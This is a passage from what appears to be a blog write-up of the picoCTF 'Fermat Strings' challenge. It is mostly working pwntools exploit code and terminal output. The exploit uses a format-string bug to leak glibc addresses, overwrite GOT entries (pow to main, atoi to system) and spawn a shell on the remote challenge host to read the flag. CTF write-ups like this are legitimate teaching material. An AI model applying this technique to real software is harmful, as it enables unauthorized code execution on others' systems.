</span></span><span style=display:flex><span>bytes_on_stack <span style=color:#f92672>=</span> <span style=color:#ae81ff>38</span>
</span></span><span style=display:flex><span>bytes_to_print <span style=color:#f92672>=</span> main_addr <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(pow_got)
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;1.%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$n&#39;</span>
</span></span></code></pre></div><p>And it works, we have converted <code>pow</code> into <code>main</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 389440
[<span class=code-blue>*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span> 1
B: <span class=code-red>$</span> 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span> 1
B: <span class=code-red>$</span> 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span> 
</code></pre></div><p>Now we have more chances to continue with the exploitation. Next, we must leak an address of Glibc to obtain its version. The purpose of this is calculate the real address of <code>system</code> and overwrite the GOT again for the final stage.</p><p>To leak an address we can use the Format String vulnerability. For that, we must call <code>printf</code> with a <code>%s</code> format (strings in C are given as pointers) and pass a GOT entry (for example, <code>puts</code>), so that the value inside the GOT entry is printed (it works like a pointer).</p><p>The strategy is similar: we will use the <code>A</code> input to store the address of the GOT entry for <code>puts</code>. And then we will put <code>%11$s</code> in the <code>B</code> input:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>puts_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601018</span>
</span></span><span style=display:flex><span>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(puts_got)
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.%11$s&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: 1.&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leaked puts() address: </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span></code></pre></div><p>After that, we can compute the base address of Glibc, knowing the offset of <code>puts</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ldd</span> chall
        linux-vdso.so.1 (0x00007ffda1df7000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f576d29c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f576d0aa000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f576d3fe000)

<span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s /lib/x86_64-linux-gnu/libc.so.6 | <span class=code-dark-green>grep</span> puts
   194: 00000000000875a0   476 FUNC    GLOBAL DEFAULT   16 _IO_<span class=code-red>puts</span>@@GLIBC_2.2.5
   429: 00000000000875a0   476 FUNC    WEAK   DEFAULT   16 <span class=code-red>puts</span>@@GLIBC_2.2.5
   504: 00000000001273c0  1268 FUNC    GLOBAL DEFAULT   16 <span class=code-red>puts</span>pent@@GLIBC_2.2.5
   690: 0000000000129090   728 FUNC    GLOBAL DEFAULT   16 <span class=code-red>puts</span>gent@@GLIBC_2.10
  1158: 0000000000085e60   384 FUNC    WEAK   DEFAULT   16 f<span class=code-red>puts</span>@@GLIBC_2.2.5
  1705: 0000000000085e60   384 FUNC    GLOBAL DEFAULT   16 _IO_f<span class=code-red>puts</span>@@GLIBC_2.2.5
  2342: 00000000000914a0   159 FUNC    WEAK   DEFAULT   16 f<span class=code-red>puts</span>_unlocked@@GLIBC_2.2.5
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>puts_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x875a0</span>
</span></span><span style=display:flex><span>glibc_base_addr <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> puts_offset
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Glibc base address: </span><span style=color:#e6db74>{</span>hex(glibc_base_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span></code></pre></div><p>And with all these, we have leaked the address of <code>puts</code> and the base address of Glibc:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 414163
[<span class=code-green>+</span>] Leaked puts() address: 0x7f4a695695a0
[<span class=code-green>+</span>] Glibc base address: 0x7f4a694e2000
[<span class=code-blue>*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span>
</code></pre></div><p>Now we can search for the offset of <code>system</code> inside Glibc using:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s /lib/x86_64-linux-gnu/libc.so.6 | <span class=code-dark-green>grep</span> system
   236: 0000000000156a80   103 FUNC    GLOBAL DEFAULT   16 svcerr_<span class=code-red>system</span>err@@GLIBC_2.2.5
   617: 0000000000055410    45 FUNC    GLOBAL DEFAULT   16 __libc_<span class=code-red>system</span>@@GLIBC_PRIVATE
  1427: 0000000000055410    45 FUNC    WEAK   DEFAULT   16 <span class=code-red>system</span>@@GLIBC_2.2.5
</code></pre></div><p>The idea is to modify the GOT entry of a function that takes a controlled string as first argument so that it points to <code>system</code>. For example, some candidates are <code>atoi</code> and <code>strcspn</code>. This time, we will be using <code>atoi</code>, whose GOT entry address is <code>0x601058</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>atoi_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601058</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>system_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x55410</span>
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> glibc_base_addr <span style=color:#f92672>+</span> system_offset
</span></span></code></pre></div><p>Now we must write the real address of <code>system</code> to the GOT entry of <code>atoi</code>. Let&rsquo;s enter 0 bytes and see the value in the GOT using GDB as before:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(pow_got)
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.%11$n&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>attach(p, gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;break atoi</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>got&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>If we run it, GDB will attach to it, break at <code>atoi</code> and then show the GOT:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class=code-dark-green>puts@GLIBC_2.2.5  →  0x7f660b8465a0</span>
[0x601020] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>
[0x601028] <span class=code-dark-green>setbuf@GLIBC_2.2.5  →  0x7f660b84dc50</span>
[0x601030] <span class=code-dark-green>printf@GLIBC_2.2.5  →  0x7f660b823e10</span>
[0x601038] <span class=code-dark-green>snprintf@GLIBC_2.2.5  →  0x7f660b823ee0</span>
[0x601040] <span class=code-dark-green>pow@GLIBC_2.2.5  →  0x400837</span>
[0x601048] <span class=code-dark-green>strcspn@GLIBC_2.2.5  →  0x7f660b9457b0</span>
[0x601050] <span class=code-dark-green>read@GLIBC_2.2.5  →  0x7f660b8d0130</span>
[0x601058] <span class=code-dark-green>atoi@GLIBC_2.2.5  →  0x7f6600000028</span>
</code></pre></div><p>As it is shown, the entry for <code>atoi</code> has a value of <code>0x7f6600000028</code>. With <code>%11$n</code> we have overwritten the last 4 bytes (namely, <code>0x00000028</code>). Using the same procedure as before, we need to write a lot of bytes. The number of bytes to be entered in the format string can be computed as:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>bytes_on_stack <span style=color:#f92672>=</span> <span style=color:#ae81ff>38</span>
</span></span><span style=display:flex><span>bytes_to_print <span style=color:#f92672>=</span> (system_addr <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span></code></pre></div><p>We limit the number to 4 bytes just in case. And then we add it to the payload and send it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>bytes_to_print <span style=color:#f92672>=</span> (system_addr <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(atoi_got) <span style=color:#f92672>+</span> p64(atoi_got <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;1.%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$n&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>If everything is correct, the GOT entry for <code>atoi</code> will be pointing to <code>system</code>. An thus, we can enter <code>/bin/sh</code> in <code>A</code> or <code>B</code> inputs to get a shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 502833
[<span class=code-green>+</span>] Leaked puts() address: 0x7f4a096565a0
[<span class=code-green>+</span>] Glibc base address: 0x7f4a095cf000
[<span class=code-blue>*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span> /bin/sh
B: <span class=code-red>$</span> 
<span class=code-red>$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><p>Alright. Let&rsquo;s tweak the exploit a little bit to spawn a shell automatically:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 507100
[<span class=code-green>+</span>] Leaked puts() address: 0x7f6218d5b5a0
[<span class=code-green>+</span>] Glibc base address: 0x7f6218cd4000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><p>However, we are not done yet. We must execute the exploit on the remote instance and get the version of Glibc. After that, we must update all the offsets.</p><p>To help with the version lookup, we can leak more function addresses of Glibc. For that, I decided to build a function called <code>leak_address</code> as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>leak_address</span>(got_entry: int) <span style=color:#f92672>-&gt;</span> int:
</span></span><span style=display:flex><span>    payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(got_entry)
</span></span><span style=display:flex><span>    payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.%11$s&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: 1.&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> u64(p<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span></code></pre></div><p>So that it is used this way:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>atoi_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601058</span>
</span></span><span style=display:flex><span>atoi_addr <span style=color:#f92672>=</span> leak_address(atoi_got)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leaked atoi() address: </span><span style=color:#e6db74>{</span>hex(atoi_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>puts_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601018</span>
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> leak_address(puts_got)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leaked puts() address: </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span></code></pre></div><p>We run the exploit remotely and it does not work. No problem for the moment. Let&rsquo;s check the leaked addresses:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py mars.picoctf.net 31929
[<span class=code-green>+</span>] Opening connection to mars.picoctf.net on port 31929: Done
[<span class=code-green>+</span>] Leaked atoi() address: 0x7f026a26c730
[<span class=code-green>+</span>] Leaked puts() address: 0x7f026a2ac5a0
[<span class=code-green>+</span>] Glibc base address: 0x7f026a225000
</code></pre></div><p>These are the Glibc versions found (their offsets are all the same):</p><p><img src=/images/picoCTF/fermat-strings-libc.png alt="Glibc Version"></p><p>We notice that the version of Glibc in the remote instance is the same that we were using locally.</p><p>However, the last stage of the exploit is not working remotely. This might be happening because we are writing a large amount of bytes in order to use <code>%n</code>. A more elegant way is using <code>%hhn</code> to write a single byte or <code>%hn</code> to write 2 bytes.</p><p>Let&rsquo;s modify our payload to have a more stable exploit. For the moment we will be using <code>%hn</code>. The last 2 bytes of the GOT entry can be overwritten in a similar way as before, just a few modifications:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>bytes_to_print <span style=color:#f92672>=</span> ((system_addr <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>) <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>0xffff</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(atoi_got) <span style=color:#f92672>+</span> p64(atoi_got <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;1.%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$hn&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>+=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;%12$hn&#39;</span><span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>attach(p, gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;break atoi</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>got&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>The first thing to notice is the use of the AND operators to get the last 2 bytes of the address of <code>system</code>. And then the modulo operator to wrap around <code>0xffff</code> if the operation was negative. After that we use <code>%11$hn</code>.</p><p>To overwrite the next 2 bytes, we need to put the address of the GOT entry for <code>atoi</code> but plus 2 (because we want to write in the next 2 bytes). And hence, we must use <code>%12$hn</code>. For now, let&rsquo;s leave the second part blank (only <code>%12$hn</code>).</p><p>We attach GDB to the process and show the GOT entries:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class=code-dark-green>puts@GLIBC_2.2.5  →  0x7f70473075a0</span>
[0x601020] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>
[0x601028] <span class=code-dark-green>setbuf@GLIBC_2.2.5  →  0x7f704730ec50</span>
[0x601030] <span class=code-dark-green>printf@GLIBC_2.2.5  →  0x7f70472e4e10</span>
[0x601038] <span class=code-dark-green>snprintf@GLIBC_2.2.5  →  0x7f70472e4ee0</span>
[0x601040] <span class=code-dark-yellow>pow@GLIBC_2.2.5  →  0x400837</span>
[0x601048] <span class=code-dark-green>strcspn@GLIBC_2.2.5  →  0x7f70474067b0</span>
[0x601050] <span class=code-dark-green>read@GLIBC_2.2.5  →  0x7f7047391130</span>
[0x601058] <span class=code-dark-green>atoi@GLIBC_2.2.5  →  0x7f7054105410</span>
</code></pre></div><p>Notice how the last 2 bytes were overwritten correctly (at least the last 3 hexadecimal digits match with <code>410</code>, which is the offset of <code>system</code>). And also, we must take into account that the next 2 bytes have the same value as the last 2 bytes (<code>5410</code>).</p><p>Knowing this, we can compute the number of bytes to write in order to place the correct number in that position:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>bytes_to_print <span style=color:#f92672>=</span> ((system_addr <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>) <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>0xffff</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(atoi_got) <span style=color:#f92672>+</span> p64(atoi_got <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;1.%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$hn&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bytes_to_print <span style=color:#f92672>=</span> (((system_addr <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>-</span> system_addr) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>0xffff</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>+=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%12$hn&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>attach(p, gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;break atoi</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>got&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>And everything works smoothly locally:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 547640
[<span class=code-green>+</span>] Leaked atoi() address: 0x7f05651e4730
[<span class=code-green>+</span>] Leaked puts() address: 0x7f05652245a0
[<span class=code-green>+</span>] Glibc base address: 0x7f056519d000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><p>Let&rsquo;s see if it works remotely:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py mars.picoctf.net 31929
[<span class=code-green>+</span>] Opening connection to mars.picoctf.net on port 31929: Done
[<span class=code-green>+</span>] Leaked atoi() address: 0x7fc3974da730
[<span class=code-green>+</span>] Leaked puts() address: 0x7fc39751a5a0
[<span class=code-green>+</span>] Glibc base address: 0x7fc397493000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
flag.txt
run
<span class=code-red>$</span> cat flag.txt
picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
</code></pre></div><div class="mt6 instapaper_ignoref">
</div></div></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
